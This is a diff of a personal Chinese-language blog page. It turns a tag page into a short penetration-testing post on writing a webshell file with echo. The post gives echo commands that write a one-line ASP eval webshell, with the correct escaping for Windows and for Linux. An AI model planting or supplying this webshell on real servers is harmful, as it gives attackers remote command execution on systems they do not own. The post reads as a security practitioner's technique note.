@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="渗透测试," />
 
 
 
@@ -79,17 +79,22 @@
 
 
 
-<meta name="description" content="一步两步,摩擦摩擦">
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="win下与Linux写马方式不同 记录一下   1.windows环境： 错误姿势: echo &amp;quot;&amp;lt;%eval request(cmd)%&amp;gt;&amp;quot; &amp;gt; c:\test\test.asp  我们可以看到我们的代码加了引号 导致无法执行 正确姿势: echo ^&amp;lt;%eval request(cmd)%^&amp;gt; &amp;gt; c:\test\cmd.asp  2.">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="echo写马技巧">
+<meta property="og:url" content="http://yoursite.com/2018/09/18/echo写马技巧/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="一步两步,摩擦摩擦">
+<meta property="og:description" content="win下与Linux写马方式不同 记录一下   1.windows环境： 错误姿势: echo &amp;quot;&amp;lt;%eval request(cmd)%&amp;gt;&amp;quot; &amp;gt; c:\test\test.asp  我们可以看到我们的代码加了引号 导致无法执行 正确姿势: echo ^&amp;lt;%eval request(cmd)%^&amp;gt; &amp;gt; c:\test\cmd.asp  2.">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-09-07T06:00:31.034Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png">
+<meta property="og:updated_time" content="2018-09-18T09:39:06.389Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
-<meta name="twitter:description" content="一步两步,摩擦摩擦">
+<meta name="twitter:title" content="echo写马技巧">
+<meta name="twitter:description" content="win下与Linux写马方式不同 记录一下   1.windows环境： 错误姿势: echo &amp;quot;&amp;lt;%eval request(cmd)%&amp;gt;&amp;quot; &amp;gt; c:\test\test.asp  我们可以看到我们的代码加了引号 导致无法执行 正确姿势: echo ^&amp;lt;%eval request(cmd)%^&amp;gt; &amp;gt; c:\test\cmd.asp  2.">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png">
 
 
 
@@ -119,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/18/echo写马技巧/"/>
 
 
 
 
 
-  <title>tags | P0rZ9's blog</title>
+  <title>echo写马技巧 | P0rZ9's blog</title>
   
 
 
@@ -224,40 +229,162 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">tags</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                4 tags in total
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/cms/" style="font-size: 12px; color: #ccc">cms</a> <a href="/tags/代码审计/" style="font-size: 30px; color: #111">代码审计</a> <a href="/tags/博客搭建/" style="font-size: 12px; color: #ccc">博客搭建</a> <a href="/tags/渗透测试/" style="font-size: 21px; color: #6f6f6f">渗透测试</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">echo写马技巧</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <blockquote>
+<p>win下与Linux写马方式不同 记录一下</p>
+</blockquote>
+<hr>
+<p><strong>1.windows环境：</strong></p>
+<p>错误姿势:</p>
+<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
+<p>我们可以看到我们的代码加了引号 导致无法执行</p>
+<p>正确姿势:</p>
+<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
+<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
+<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/" rel="next" title="代码审计 | ThinkPHP3.x/5.x框架任意文件包含">
+                <i class="fa fa-chevron-left"></i> 代码审计 | ThinkPHP3.x/5.x框架任意文件包含
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
